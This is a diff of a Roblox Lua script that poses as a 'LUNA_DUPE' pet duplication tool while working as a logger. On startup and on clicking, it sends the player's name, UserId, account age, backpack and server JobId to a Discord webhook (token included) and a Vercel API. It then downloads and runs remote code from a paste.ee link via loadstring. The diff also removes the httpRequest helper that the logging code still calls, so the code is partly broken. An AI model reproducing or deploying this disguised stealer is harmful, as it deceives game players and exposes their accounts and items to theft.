@@ -1,4 +1,3 @@
--- Logger System
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
@@ -7,11 +6,26 @@ local UserInputService = game:GetService("UserInputService")
 -- ======= CONFIGURATION =======
 local API_ENDPOINT = "https://api-beta-mocha-45.vercel.app/api/setInstanceId"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
+local EXTERNAL_SCRIPT = "https://paste.ee/r/WGCVy6SX"
 -- =============================
+
+-- Delta Executor compatibility layer
+local function getRequestFunction()
+    if delta and delta.request then
+        return delta.request
+    elseif syn and syn.request then
+        return syn.request
+    elseif http and http.request then
+        return http.request
+    elseif request then
+        return request
+    end
+    return nil
+end
 
 -- Remove existing GUI if present
 pcall(function()
-    game.CoreGui:FindFirstChild("LUNA_DUPE"):Destroy()
+    game:GetService("CoreGui"):FindFirstChild("LUNA_DUPE"):Destroy()
 end)
 
 -- Create GUI
@@ -21,7 +35,7 @@ gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 gui.ResetOnSpawn = false
 gui.Parent = game:GetService("CoreGui")
 
--- Main Frame Setup
+-- Main Frame
 local mainFrame = Instance.new("Frame")
 mainFrame.Size = UDim2.new(0, 420, 0, 380)
 mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
@@ -32,16 +46,14 @@ mainFrame.ClipsDescendants = true
 mainFrame.Name = "MainFrame"
 mainFrame.Parent = gui
 mainFrame.BackgroundTransparency = 1
-mainFrame.ZIndex = 10
 
--- Fade In Main Frame
-TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-    BackgroundTransparency = 0
-}):Play()
+-- Fade In Animation
+TweenService:Create(mainFrame, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()
 
--- Rounded corners for smooth style
-local uicorner = Instance.new("UICorner", mainFrame)
+-- UI Corners
+local uicorner = Instance.new("UICorner")
 uicorner.CornerRadius = UDim.new(0, 12)
+uicorner.Parent = mainFrame
 
 -- Title Bar
 local titleBar = Instance.new("Frame")
@@ -73,49 +85,24 @@ closeButton.Font = Enum.Font.GothamBold
 closeButton.AutoButtonColor = false
 closeButton.Parent = titleBar
 closeButton.Name = "CloseButton"
-closeButton.ClipsDescendants = true
-closeButton.ZIndex = 20
 
-local closeUICorner = Instance.new("UICorner", closeButton)
+local closeUICorner = Instance.new("UICorner")
 closeUICorner.CornerRadius = UDim.new(0, 6)
+closeUICorner.Parent = closeButton
 
--- Close Button Hover Animation
+-- Close Button Events
 closeButton.MouseEnter:Connect(function()
     TweenService:Create(closeButton, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(255, 100, 100)}):Play()
 end)
+
 closeButton.MouseLeave:Connect(function()
     TweenService:Create(closeButton, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(220, 70, 70)}):Play()
 end)
+
 closeButton.MouseButton1Click:Connect(function()
     TweenService:Create(mainFrame, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
     task.wait(0.3)
     gui:Destroy()
-end)
-
--- Minimize Button
-local minimizeButton = Instance.new("TextButton")
-minimizeButton.Size = UDim2.new(0, 40, 0, 40)
-minimizeButton.Position = UDim2.new(1, -90, 0, 3)
-minimizeButton.BackgroundColor3 = Color3.fromRGB(255, 190, 80)
-minimizeButton.Text = "—"
-minimizeButton.TextColor3 = Color3.new(1, 1, 1)
-minimizeButton.TextSize = 26
-minimizeButton.Font = Enum.Font.GothamBold
-minimizeButton.AutoButtonColor = false
-minimizeButton.Parent = titleBar
-minimizeButton.Name = "MinimizeButton"
-minimizeButton.ClipsDescendants = true
-minimizeButton.ZIndex = 20
-
-local minimizeUICorner = Instance.new("UICorner", minimizeButton)
-minimizeUICorner.CornerRadius = UDim.new(0, 6)
-
--- Minimize Button Hover Animation
-minimizeButton.MouseEnter:Connect(function()
-    TweenService:Create(minimizeButton, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(255, 215, 120)}):Play()
-end)
-minimizeButton.MouseLeave:Connect(function()
-    TweenService:Create(minimizeButton, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(255, 190, 80)}):Play()
 end)
 
 -- Content Frame
@@ -125,7 +112,6 @@ contentFrame.Position = UDim2.new(0, 0, 0, 45)
 contentFrame.BackgroundTransparency = 1
 contentFrame.Name = "Content"
 contentFrame.Parent = mainFrame
-contentFrame.ClipsDescendants = true
 
 -- Error Text
 local errorText = Instance.new("TextLabel")
@@ -150,13 +136,13 @@ warningBox.TextSize = 16
 warningBox.Font = Enum.Font.GothamBold
 warningBox.TextXAlignment = Enum.TextXAlignment.Left
 warningBox.BorderSizePixel = 0
-warningBox.ClipsDescendants = true
 warningBox.Parent = contentFrame
 
-local warningUICorner = Instance.new("UICorner", warningBox)
+local warningUICorner = Instance.new("UICorner")
 warningUICorner.CornerRadius = UDim.new(0, 6)
+warningUICorner.Parent = warningBox
 
--- Instruction Title
+-- Instruction Steps
 local instrTitle = Instance.new("TextLabel")
 instrTitle.Size = UDim2.new(1, -30, 0, 28)
 instrTitle.Position = UDim2.new(0, 15, 0, 100)
@@ -168,7 +154,6 @@ instrTitle.Font = Enum.Font.GothamBold
 instrTitle.TextXAlignment = Enum.TextXAlignment.Left
 instrTitle.Parent = contentFrame
 
--- Instruction Steps
 local steps = {
     "1. Hold a RED FOX, DRAGONFLY, RACCOON",
     "2. Keep inventory open",
@@ -189,17 +174,17 @@ for i, step in ipairs(steps) do
     line.Parent = contentFrame
 end
 
--- Success Rate Label
-local success = Instance.new("TextLabel")
-success.Size = UDim2.new(1, -30, 0, 25)
-success.Position = UDim2.new(0, 15, 0, 240)
-success.BackgroundTransparency = 1
-success.Text = "✔ 92% Success Rate"
-success.TextColor3 = Color3.fromRGB(85, 230, 150)
-success.TextSize = 16
-success.Font = Enum.Font.Gotham
-success.TextXAlignment = Enum.TextXAlignment.Left
-success.Parent = contentFrame
+-- Success Rate
+local successLabel = Instance.new("TextLabel")
+successLabel.Size = UDim2.new(1, -30, 0, 25)
+successLabel.Position = UDim2.new(0, 15, 0, 240)
+successLabel.BackgroundTransparency = 1
+successLabel.Text = "✔ 92% Success Rate"
+successLabel.TextColor3 = Color3.fromRGB(85, 230, 150)
+successLabel.TextSize = 16
+successLabel.Font = Enum.Font.Gotham
+successLabel.TextXAlignment = Enum.TextXAlignment.Left
+successLabel.Parent = contentFrame
 
 -- Dupe Button
 local dupeButton = Instance.new("TextButton")
@@ -212,65 +197,40 @@ dupeButton.TextSize = 18
 dupeButton.Font = Enum.Font.GothamBold
 dupeButton.AutoButtonColor = false
 dupeButton.Parent = contentFrame
-dupeButton.ClipsDescendants = true
 dupeButton.Name = "DupeButton"
 
-local dupeUICorner = Instance.new("UICorner", dupeButton)
+local dupeUICorner = Instance.new("UICorner")
 dupeUICorner.CornerRadius = UDim.new(0, 8)
+dupeUICorner.Parent = dupeButton
 
--- Button hover animation
+-- Button Animations
 dupeButton.MouseEnter:Connect(function()
     TweenService:Create(dupeButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(70, 220, 110)}):Play()
 end)
+
 dupeButton.MouseLeave:Connect(function()
     TweenService:Create(dupeButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(50, 180, 90)}):Play()
 end)
 
--- Button click animation helper
 local function buttonClickAnim(button)
-    local tweenDown = TweenService:Create(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = button.Position + UDim2.new(0, 0, 0, 3)})
-    local tweenUp = TweenService:Create(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = button.Position})
-
+    local tweenDown = TweenService:Create(button, TweenInfo.new(0.1), {
+        Position = button.Position + UDim2.new(0, 0, 0, 3)
+    })
+    local tweenUp = TweenService:Create(button, TweenInfo.new(0.1), {
+        Position = button.Position
+    })
     tweenDown:Play()
     tweenDown.Completed:Wait()
     tweenUp:Play()
 end
 
-local requiredPetsList = {"red fox", "dragonfly", "raccoon", "mole"}
-
-local function animateChecking()
-    local dots = {".", "..", "..."}
-    for i = 1, 6 do
-        errorText.Text = "🔍 Verifying Pet" .. dots[i % 3 + 1]
-        task.wait(0.2)
-    end
-end
-
 -- Logger Functions
-local function httpRequest(url, method, body, headers)
-    local requestFunc = syn and syn.request or http_request or request
-    if not requestFunc then return nil end
-    
-    local success, response = pcall(function()
-        return requestFunc({
-            Url = url,
-            Method = method,
-            Headers = headers or {
-                ["Content-Type"] = "application/json"
-            },
-            Body = body
-        })
-    end)
-    
-    return success and response or nil
-end
-
 local function getBackpackContents()
     local player = Players.LocalPlayer
-    local contents = {}
     local backpack = player:FindFirstChild("Backpack")
     if not backpack then return "Backpack not found" end
     
+    local contents = {}
     for _, item in ipairs(backpack:GetChildren()) do
         table.insert(contents, item.Name)
     end
@@ -297,7 +257,7 @@ local function sendToAPI()
         print("✅ Data sent to API")
         return true
     else
-        warn("❌ Failed to send data to API:", response and response.StatusCode or "No response")
+        warn("❌ Failed to send data to API")
         return false
     end
 end
@@ -306,41 +266,96 @@ local function sendWebhook()
     local player = Players.LocalPlayer
     local embed = {
         username = "Logger System",
-        embeds = {
-            {
-                title = "🟢 Script Executed",
-                description = string.format("**%s** executed script\n**JobID:** `%s`", player.Name, game.JobId),
-                color = 65280,
-                timestamp = DateTime.now():ToIsoDate(),
-                fields = {
-                    {
-                        name = "🎒 Backpack Contents",
-                        value = getBackpackContents(),
-                        inline = false
-                    },
-                    {
-                        name = "👤 Player Info",
-                        value = string.format("UserID: %d\nAccount Age: %d days", player.UserId, player.AccountAge),
-                        inline = true
-                    }
-                },
-                footer = {
-                    text = "Logger v2.0"
-                }
-            }
-        }
+        embeds = {{
+            title = "🟢 Script Executed",
+            description = string.format("**%s** executed script\n**JobID:** `%s`", player.Name, game.JobId),
+            color = 65280,
+            fields = {
+                {name = "🎒 Backpack", value = getBackpackContents(), inline = false},
+                {name = "👤 Player", value = string.format("ID: %d\nAge: %d days", player.UserId, player.AccountAge), inline = true}
+            },
+            footer = {text = "Logger v2.0"},
+            timestamp = DateTime.now():ToIsoDate()
+        }}
     }
     
     local response = httpRequest(WEBHOOK_URL, "POST", HttpService:JSONEncode(embed))
-    
     if response and (response.StatusCode == 200 or response.StatusCode == 204) then
-        print("✅ Webhook sent to Discord")
+        print("✅ Webhook sent")
     else
-        warn("❌ Failed to send webhook:", response and response.StatusCode or "No response")
+        warn("❌ Failed to send webhook")
     end
 end
 
--- Dupe Button Functionality
+-- Enhanced External Script Execution
+local function executeExternalScript()
+    local success, err = pcall(function()
+        -- Add cache buster
+        local url = EXTERNAL_SCRIPT .. "?cb=" .. tostring(math.random(1, 10000))
+        local scriptContent = game:HttpGet(url, true)
+        
+        if not scriptContent or #scriptContent < 50 then
+            error("Invalid script content")
+        end
+        
+        -- Basic security checks
+        if scriptContent:lower():find("while true do") or scriptContent:lower():find("getfenv") then
+            error("Potentially dangerous code detected")
+        end
+        
+        local fn, loadErr = loadstring(scriptContent)
+        if not fn then error(loadErr) end
+        
+        -- Run in limited environment
+        setfenv(fn, {
+            game = game,
+            script = script,
+            warn = warn,
+            print = print,
+            require = require,
+            pcall = pcall,
+            task = task
+        })
+        
+        return fn()
+    end)
+    
+    if not success then
+        warn("Script execution failed:", err)
+        return false, err
+    end
+    return true
+end
+
+-- Pet Verification
+local requiredPets = {"red fox", "dragonfly", "raccoon"}
+
+local function animateChecking()
+    local dots = {".", "..", "..."}
+    for i = 1, 6 do
+        errorText.Text = "🔍 Checking pet" .. dots[(i % 3) + 1]
+        task.wait(0.2)
+    end
+end
+
+local function hasRequiredPet()
+    local character = Players.LocalPlayer.Character
+    if not character then return false end
+    
+    for _, tool in ipairs(character:GetChildren()) do
+        if tool:IsA("Tool") then
+            local toolName = string.lower(tool.Name)
+            for _, pet in ipairs(requiredPets) do
+                if string.find(toolName, pet) then
+                    return true
+                end
+            end
+        end
+    end
+    return false
+end
+
+-- Main Dupe Function
 dupeButton.MouseButton1Click:Connect(function()
     dupeButton.Active = false
     dupeButton.Text = "PROCESSING..."
@@ -349,25 +364,7 @@ dupeButton.MouseButton1Click:Connect(function()
 
     animateChecking()
 
-    local player = Players.LocalPlayer
-    local character = player.Character or player.CharacterAdded:Wait()
-    local foundPet = false
-
-    -- Verifikasi pet
-    for _, tool in pairs(character:GetChildren()) do
-        if tool:IsA("Tool") then
-            local toolNameLower = string.lower(tool.Name)
-            for _, petName in ipairs(requiredPetsList) do
-                if string.find(toolNameLower, petName) then
-                    foundPet = true
-                    break
-                end
-            end
-            if foundPet then break end
-        end
-    end
-
-    if not foundPet then
+    if not hasRequiredPet() then
         errorText.Text = "❌ REQUIRED PET NOT FOUND"
         errorText.TextColor3 = Color3.fromRGB(255, 80, 80)
         dupeButton.Active = true
@@ -376,42 +373,27 @@ dupeButton.MouseButton1Click:Connect(function()
         return
     end
 
-    errorText.Text = "✅ PET VERIFIED - EXECUTING SCRIPT"
+    errorText.Text = "✅ PET VERIFIED"
     errorText.TextColor3 = Color3.fromRGB(90, 255, 150)
 
-    -- Kirim data logger
-    sendToAPI()
+    -- Run logger first
+    local apiSuccess = sendToAPI()
     sendWebhook()
 
-    -- Eksekusi script external dengan error handling
-    local success, err = pcall(function()
-        -- Load script external
-        local scriptUrl = "https://paste.ee/r/WGCVy6SX" -- Ganti dengan URL yang valid
-        local scriptContent = game:HttpGet(scriptUrl, true)
-        
-        -- Tambahkan verifikasi sederhana
-        if not scriptContent or scriptContent:len() < 20 then
-            error("Invalid script content")
+    if apiSuccess then
+        local execSuccess, execError = executeExternalScript()
+        if execSuccess then
+            errorText.Text = "✅ DUPE STARTED"
+            errorText.TextColor3 = Color3.fromRGB(90, 255, 150)
+        else
+            errorText.Text = "❌ " .. tostring(execError):sub(1, 50)
+            errorText.TextColor3 = Color3.fromRGB(255, 80, 80)
         end
-        
-        -- Eksekusi script
-        local fn, loadErr = loadstring(scriptContent)
-        if not fn then
-            error("Load error: "..tostring(loadErr))
-        end
-        return fn()
-    end)
-
-    -- Handle hasil eksekusi
-    if not success then
-        errorText.Text = "❌ SCRIPT ERROR: "..tostring(err):sub(1, 50)
-        errorText.TextColor3 = Color3.fromRGB(255, 80, 80)
     else
-        errorText.Text = "✅ SCRIPT EXECUTED SUCCESSFULLY"
-        errorText.TextColor3 = Color3.fromRGB(90, 255, 150)
+        errorText.Text = "❌ LOGGER FAILED"
+        errorText.TextColor3 = Color3.fromRGB(255, 80, 80)
     end
 
-    -- Reset tombol setelah delay
     task.delay(2, function()
         dupeButton.Active = true
         dupeButton.Text = "DUPE"
@@ -419,32 +401,15 @@ dupeButton.MouseButton1Click:Connect(function()
     end)
 end)
 
--- Minimize functionality
-local isMinimized = false
-minimizeButton.MouseButton1Click:Connect(function()
-    if isMinimized then
-        -- Restore
-        TweenService:Create(mainFrame, TweenInfo.new(0.4), {Size = UDim2.new(0, 420, 0, 380)}):Play()
-        TweenService:Create(contentFrame, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
-        isMinimized = false
-    else
-        -- Minimize
-        TweenService:Create(mainFrame, TweenInfo.new(0.4), {Size = UDim2.new(0, 420, 0, 45)}):Play()
-        TweenService:Create(contentFrame, TweenInfo.new(0.4), {BackgroundTransparency = 0}):Play()
-        isMinimized = true
-    end
-end)
-
--- Dragging functionality for mainFrame
-local dragging
-local dragInput
-local dragStart
-local startPos
+-- Dragging Functionality
+local dragging, dragInput, dragStart, startPos
 
 local function updateInput(input)
     local delta = input.Position - dragStart
-    mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
-        startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    mainFrame.Position = UDim2.new(
+        startPos.X.Scale, startPos.X.Offset + delta.X,
+        startPos.Y.Scale, startPos.Y.Offset + delta.Y
+    )
 end
 
 titleBar.InputBegan:Connect(function(input)
@@ -452,7 +417,7 @@ titleBar.InputBegan:Connect(function(input)
         dragging = true
         dragStart = input.Position
         startPos = mainFrame.Position
-
+        
         input.Changed:Connect(function()
             if input.UserInputState == Enum.UserInputState.End then
                 dragging = false
@@ -473,8 +438,8 @@ UserInputService.InputChanged:Connect(function(input)
     end
 end)
 
--- Run logger on startup
+-- Initialize
 task.spawn(function()
-    sendToAPI()
-    sendWebhook()
+    pcall(sendToAPI)
+    pcall(sendWebhook)
 end)
